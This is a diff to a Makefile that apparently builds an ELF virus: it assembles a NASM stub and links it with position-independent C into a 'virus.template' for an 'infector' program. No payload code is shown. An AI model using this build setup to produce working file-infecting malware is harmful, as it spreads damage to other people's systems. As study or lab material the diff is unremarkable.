@@ -1,15 +1,27 @@
 NAME = infector
 COLOR = "\033[92m"
 
-SRC = main.c
+SRC = infector.c
 
 COMPILER = gcc
-FLAGS = -Wextra -Wall -Werror
+FLAGS = 
 
-SRC_DIR 			= src
-OBJ_DIR				= obj
+SRC_DIR				= .
+TMP_DIR				= .tmp
+OBJ_DIR				= $(TMP_DIR)/obj
+BIN_DIR				= bin
 
 OBJ	=	$(addprefix $(OBJ_DIR)/, $(notdir $(SRC:.c=.o)))
+
+VIRUS = $(BIN_DIR)/virus.template
+
+VIRUS_WRAPPER = $(TMP_DIR)/virus_wrapper.o
+VIRUS_C = $(TMP_DIR)/virus.o
+
+VIRUS_ASM = $(BIN_DIR)/virus_start.s
+VIRUS_C_TEMPLATE = virus.c
+
+LD_RULES = $(BIN_DIR)/virus_linking.lds
 
 all: $(NAME)
 
@@ -20,11 +32,23 @@ clprint:
 clfprint:
 	@echo $(COLOR)"fclean" $(NAME) "\033[0m"
 
-$(NAME): $(OBJ)
+$(NAME): $(OBJ) $(VIRUS)
 	@echo '----------'
-	$(COMPILER) $(FLAGS) -o $(NAME) $(OBJ) prog
+	$(COMPILER) $(FLAGS) -o $(NAME) $(OBJ)
+
+$(VIRUS): $(TMP_DIR) $(VIRUS_WRAPPER) $(VIRUS_C)
+	ld -o $@ -T $(LD_RULES) $(VIRUS_WRAPPER) $(VIRUS_C)
+
+$(VIRUS_WRAPPER):
+	nasm -f elf64 $(VIRUS_ASM) -o $@
+
+$(VIRUS_C):
+	gcc -fPIC -c $(VIRUS_C_TEMPLATE) -o $@
 
 $(OBJ): | $(OBJ_DIR)
+
+$(TMP_DIR):
+	mkdir -p $@
 
 $(OBJ_DIR):
 	@$(MAKE) mprint
@@ -38,6 +62,7 @@ clean:
 	@$(MAKE) clprint
 	rm -rf $(OBJ)
 	rm -df $(OBJ_DIR)
+	rm -rf $(TMP_DIR)
 
 fclean: clean
 	@echo '----------'
